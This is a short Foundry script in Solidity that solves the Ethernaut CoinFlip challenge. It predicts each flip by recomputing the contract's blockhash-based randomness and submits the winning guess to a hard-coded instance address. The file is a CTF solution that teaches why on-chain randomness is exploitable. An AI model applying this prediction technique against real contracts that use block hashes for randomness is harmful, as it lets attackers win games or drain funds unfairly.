// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "ethernaut/03CoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

contract CoinFlipScript is Script {
    address public coinFlipAddress = 0xB4E591f3C8413a1823b5B6D4550Fe7f495A4a149;
    CoinFlip public instance = CoinFlip(coinFlipAddress);
    uint256 public FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
        console.log("coinFlip.consecutiveWins()", instance.consecutiveWins());

        vm.stopBroadcast();
    }
}
